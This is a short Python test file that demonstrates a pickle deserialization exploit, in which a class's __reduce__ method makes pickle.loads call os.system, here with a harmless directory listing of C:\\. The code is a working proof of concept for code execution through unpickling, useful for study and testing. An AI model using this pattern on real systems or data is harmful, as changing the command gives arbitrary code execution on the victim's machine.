# test_serialize.py
import os
import pickle

class ShellExploit(object):
    def __reduce__(self):
        # Este código ahora intentará listar el contenido del directorio C:\ en Windows
        return (os.system, ('dir C:\\',))

def serialize():
    shellcode = pickle.dumps(ShellExploit())
    return shellcode

def deserialize(exploit_code):
    pickle.loads(exploit_code)

if __name__ == '__main__':
    shellcode = serialize()
    deserialize(shellcode)
